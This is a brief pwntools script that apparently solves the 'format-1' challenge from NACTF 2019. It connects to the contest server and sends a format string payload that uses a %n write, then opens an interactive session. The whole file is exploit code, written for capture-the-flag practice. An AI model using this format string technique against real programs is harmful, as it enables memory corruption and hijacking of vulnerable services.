from pwn import *
s = remote('shell.2019.nactf.com', 31560)
# fgets = 0xffffd460
# s = process('./format-1')
raw_input('debug')
payload = '%42x%24$n'
s.sendline(payload)
s.interactive()
